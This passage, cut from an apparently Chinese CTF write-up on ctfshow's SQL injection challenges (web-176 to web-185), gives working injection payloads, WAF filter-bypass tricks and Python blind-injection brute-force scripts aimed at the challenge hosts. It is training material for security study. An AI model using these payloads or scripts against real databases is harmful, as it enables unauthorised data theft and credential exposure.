class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//对传入的参数进行了过滤</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-comment">//代码过于简单，不宜展示</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>解题思路：这里过滤了select，可以使用大小写绕过，但是没必要用联合查询，直接<code>1&#39; or 1=1 --+</code>即可</p><p>payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">万能密码<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">使用union联合查询并用大小写绕过select过滤</span><br><span class="hljs-string">//测出表有3列</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br>//爆出库名为ctfshow_web<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union Select 1,2,database() --+</span><br><span class="hljs-string">//爆出表名ctfshow_user</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">Select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;ctfshow_web&#x27;</span> <span class="hljs-comment">--+</span><br>//爆出列名id,username,<span class="hljs-keyword">password</span><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union Select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>ctfshow_user<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">//根据列名爆出数据得到flag</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">Select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-177（空格过滤绕过（-、-09））"><a href="#web-177（空格过滤绕过（-、-09））" class="headerlink" title="web-177（空格过滤绕过（&#x2F;**&#x2F;、%09））"></a>web-177（空格过滤绕过（&#x2F;**&#x2F;、%09））</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//对传入的参数进行了过滤</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-comment">//代码过于简单，不宜展示</span><br>  &#125;<br>     <br></code></pre></td></tr></table></figure><p>解题思路：</p><p>有过滤的字符型注入，试了一下，对空格和<code>--+</code>有过滤，用 %09或者&#x2F;**&#x2F;注释符绕过空格过滤，用%23即#（这里只能用%23）绕过<code>--+</code>过滤。</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs haml">前面爆库名爆表名爆列名默认流程<br>-<span class="language-ruby"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span></span><br><br>-<span class="language-ruby"><span class="hljs-string">1&#x27;</span>/**<span class="hljs-regexp">/union/</span>**<span class="hljs-regexp">/select/</span>**<span class="hljs-regexp">/1,2,password/</span>**<span class="hljs-regexp">/from/</span>**<span class="hljs-regexp">/ctfshow_user/</span>**<span class="hljs-regexp">/where/</span>**<span class="hljs-regexp">/username=&#x27;flag&#x27;%23</span></span><br><br># ()中的空格也可用 ` 替代  某些情况下<br>-<span class="language-ruby"><span class="hljs-regexp">1&#x27;union/</span>**<span class="hljs-regexp">/select/</span>**<span class="hljs-regexp">/1,2,(select`password`from`ctfshow_user`where`username`=&#x27;flag&#x27;)%23</span></span><br><br>    <br>    <br>可替代空格<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span>(在特定字符集才能利用)</span><br>以上均为URL编码<br><span class="hljs-comment"></span><br><span class="hljs-comment">/**/组合</span><br>括号<br><span class="hljs-tag">%<span class="hljs-selector-tag">23</span></span>代替注释符 -- <br></code></pre></td></tr></table></figure><hr><h2 id="web-178（空格过滤绕过（-0b换行符、-09））"><a href="#web-178（空格过滤绕过（-0b换行符、-09））" class="headerlink" title="web-178（空格过滤绕过（%0b换行符、%09））"></a>web-178（空格过滤绕过（%0b换行符、%09））</h2><p>解题思路：</p><p>过滤掉了&#x2F;**&#x2F; # ，所以不能用&#x2F;**&#x2F; 来代替空格了</p><p><strong>可以用换行符%0b或者%09来代替空格</strong></p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%09</span>union<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%091</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>ctfshow_user<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>username<span class="hljs-operator">=</span>&#x27;flag&#x27;<span class="hljs-variable">%23</span><br><br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>bunion<span class="hljs-variable">%0</span>bselect<span class="hljs-variable">%0</span>b<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%0</span>bfrom<span class="hljs-variable">%0</span>bctfshow_user<span class="hljs-variable">%0</span>bwhere<span class="hljs-variable">%0</span>busername<span class="hljs-operator">=</span>&#x27;flag&#x27;<span class="hljs-variable">%23</span><br><br>万能密码一样可以 <br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>aor<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%23</span><br></code></pre></td></tr></table></figure><hr><h2 id="we-179（空格过滤绕过（-0c））"><a href="#we-179（空格过滤绕过（-0c））" class="headerlink" title="we-179（空格过滤绕过（%0c））"></a>we-179（空格过滤绕过（%0c））</h2><p>解题思路：</p><p>有过滤的字符型注入，和上上题差不多，增加了对 <code>%09 %0a %0b %0d</code> 的过滤，%0c 可以用。</p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span><br><br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cunion<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%0</span>cfrom<span class="hljs-variable">%0</span>cctfshow_user<span class="hljs-variable">%0</span>cwhere<span class="hljs-variable">%0</span>cusername<span class="hljs-operator">=</span>&#x27;flag&#x27;<span class="hljs-variable">%23</span><br><br>()中的空格可用 ` 替代，这样更简单<br><span class="hljs-number">-1</span>&#x27;union<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span>`password`from`ctfshow_user`where`username`<span class="hljs-operator">=</span>&#x27;flag&#x27;)<span class="hljs-variable">%23</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-180（-23-注释符过滤绕过）"><a href="#web-180（-23-注释符过滤绕过）" class="headerlink" title="web-180（#(%23)注释符过滤绕过）"></a>web-180（#(%23)注释符过滤绕过）</h2><p>解题思路：</p><p>增加了对 <code>#(%23)</code> 的过滤，这里使用 – (–后加个空格) 绕过。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm"># 避开结尾注释<br><span class="hljs-number">-1</span>&#x27;union<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span>`password`from`ctfshow_user`where`username`<span class="hljs-operator">=</span>&#x27;flag&#x27;)<span class="hljs-punctuation">,</span>&#x27;<span class="hljs-number">2</span><br>#有结尾注释   **<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>**<br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cunion<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>cpassword<span class="hljs-variable">%0</span>cfrom<span class="hljs-variable">%0</span>cctfshow_user<span class="hljs-variable">%0</span>cwhere<span class="hljs-variable">%0</span>cusername<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>&#x27;flag&#x27;)<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br><br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cunion<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%0</span>cfrom<span class="hljs-variable">%0</span>cctfshow_user<span class="hljs-variable">%0</span>cwhere<span class="hljs-variable">%0</span>cusername<span class="hljs-operator">=</span>&#x27;flag&#x27;<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br><br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-181（空格过滤绕过、逻辑运算优先级）"><a href="#web-181（空格过滤绕过、逻辑运算优先级）" class="headerlink" title="web-181（空格过滤绕过、逻辑运算优先级）"></a>web-181（空格过滤绕过、逻辑运算优先级）</h2><p>查询语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//对传入的参数进行了过滤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure><p><strong>没有空格和 select 可以用，这里利用逻辑运算的优先级构造 and 语句，绕过查询语句前面的 username !&#x3D; flag，且不能含有空格</strong></p><p><strong>and&gt;or</strong><br><strong>关于优先级问题就跟加减号与乘除号一样，and先运算，那么and的运算结果过程如何解释：需要同时满足两边的条件才会返回true那么这里就是让第一个and语句返回false让后面的and语句来做到知行的效果</strong></p><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">0<span class="hljs-string">&#x27;or(id=26)and&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>and的优先级比or要高，故注入后的语句变成了<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">id</span>,username,password frpm ctfshow_user <span class="hljs-built_in">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> and <span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;0&#x27;</span>or(<span class="hljs-built_in">id</span>=26)and<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-built_in">limit</span> 1;<br>前面满足条件<span class="hljs-built_in">id</span>=0的记录不存在，故该语句可简化为<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">id</span>,username,password from ctfshow_user <span class="hljs-built_in">where</span> (0) or(<span class="hljs-built_in">id</span>=26)and<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-built_in">limit</span> 1;<br>先计算and，再计算or，最后得到满足<span class="hljs-built_in">id</span>=26的记录<br></code></pre></td></tr></table></figure><hr><h2 id="web-182（逻辑运算优先级、盲注）"><a href="#web-182（逻辑运算优先级、盲注）" class="headerlink" title="web-182（逻辑运算优先级、盲注）"></a>web-182（逻辑运算优先级、盲注）</h2><p>返回逻辑</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//对传入的参数进行了过滤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select</span>|<span class="hljs-string">flag/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure><p>比上题多过滤了一个flag，依然可以用上题的payload，或者用盲注</p><p>payload：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-number">0</span><span class="hljs-symbol">&#x27;or</span>(id=<span class="hljs-number">26</span>)<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=&#x27;<span class="hljs-number">1</span><br><br>盲注payload，在<span class="hljs-keyword">and</span>后写盲注语句即可<br>-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;or</span>(id=<span class="hljs-number">26</span>)andif(xxxx)<br></code></pre></td></tr></table></figure><hr><h2 id="web-183（count、python脚本进行like或正则匹配）"><a href="#web-183（count、python脚本进行like或正则匹配）" class="headerlink" title="web-183（count、python脚本进行like或正则匹配）"></a>web-183（count、python脚本进行like或正则匹配）</h2><p>源码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(pass) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br>      <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//对传入的参数进行了过滤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">file</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">or</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">select</span>|<span class="hljs-string">and</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">into/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure><p>查询结果</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>返回用户表的记录总数<br>      <span class="hljs-variable">$user_count</span> = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>这里会将我们传入的tableName值进行sql语句的拼接。所以我们可以利用前面的count加like匹配来爆破flag</p><p>python脚本：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://c08bee29-77ce-4dc6-94e9-7dd98c17a11c.challenge.ctf.show/select-waf.php&#x27;</span><br>str = <span class="hljs-string">&#x27;&#123;1234567890-abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span><span class="hljs-comment">//爆破字典</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):<span class="hljs-comment">//爆破位数，如果不确定flag的位数可以调大点</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str:<br>        <span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">&#x27;tableName&#x27;</span>:<span class="hljs-string">&#x27;`ctfshow_user`where`pass`like&quot;ctfshow&#123;&#125;%&quot;&#x27;</span>.format(flag+i)&#125;<br>        r = requests.post(<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>,url=url)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&#x27;$user_count = 1;&#x27;</span>) &gt; <span class="hljs-number">0</span>:<span class="hljs-comment">//如果匹配成功，会输出$user_count = 1</span><br>            flag+=i<br>            print(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><span class="hljs-comment">//没匹配到直接跳过</span><br></code></pre></td></tr></table></figure><p><strong>注意：在拼接sql语句的时候，表名和列名要用反引号&#96;围起来，或者使用圆括号()括起来，避免sql语句无法执行，因为sql中不能存在空格</strong></p><hr><h2 id="web-184（group-by绕过where过滤、十六进制绕过单双引号过滤、regexp）"><a href="#web-184（group-by绕过where过滤、十六进制绕过单双引号过滤、regexp）" class="headerlink" title="web-184（group by绕过where过滤、十六进制绕过单双引号过滤、regexp）"></a>web-184（group by绕过where过滤、十六进制绕过单双引号过滤、regexp）</h2><p>where被禁用了。。。用group by代替<br>双引号单引号也被过滤了，<strong>改为十六进制进行绕过</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://140e0424-a88d-4d4c-831f-b3d9390a7278.challenge.ctf.show/select-waf.php&quot;</span><br><br>flagstr = <span class="hljs-string">&quot;&#123;abcdefghijklmnopqrstuvwxyz-0123456789&#125;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    a = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        a += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(x)).replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> a<br>    <br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>        data = &#123;<br>            <span class="hljs-string">&quot;tableName&quot;</span>:<span class="hljs-string">&quot;ctfshow_user group by pass having pass regexp(0x&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(to_hex(flag + x))<br>        &#125;<br>        r = requests.post(url,data=data)<br><br>        <span class="hljs-keyword">if</span> (r.text.find(<span class="hljs-string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="hljs-number">0</span>):<br>            flag += x<br>            <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><p>注意：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">1、这里<span class="hljs-keyword">where</span>被过滤了所以可以用<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> pass <span class="hljs-keyword">having</span> pass语句代替<span class="hljs-keyword">where</span>进行条件查询<br>2、由于过滤了单双引号所以要使用reg<span class="hljs-meta">exp</span>(0x&#123;&#125;)的格式，因为十六进制也能在mysql中被解析，且不用使用单双引号<br>比如regexp <span class="hljs-string">&#x27;a&#x27;</span>就相当于reg<span class="hljs-meta">exp</span>(0x61)<br></code></pre></td></tr></table></figure><hr><h2 id="web-185（python脚本正则匹配、数字过滤绕过）"><a href="#web-185（python脚本正则匹配、数字过滤绕过）" class="headerlink" title="web-185（python脚本正则匹配、数字过滤绕过）"></a>web-185（python脚本正则匹配、数字过滤绕过）</h2><p>查询语句</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tableName&#x27;</span>].<span class="hljs-string">&quot;;&quot;</span>;<br>      <br></code></pre></td></tr></table></figure><p>返回逻辑</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//对传入的参数进行了过滤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/\<span class="hljs-symbol">*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\0x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">[0-9]</span>|<span class="hljs-string">file</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">or</span>|<span class="hljs-string">\x7c</span>|<span class="hljs-string">select</span>|<span class="hljs-string">and</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">into</span>|<span class="hljs-string">where</span>|<span class="hljs-string">\x26</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">union</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">sleep</span>|<span class="hljs-string">benchmark/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br></code></pre></td></tr></table></figure><p>查询结果</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span 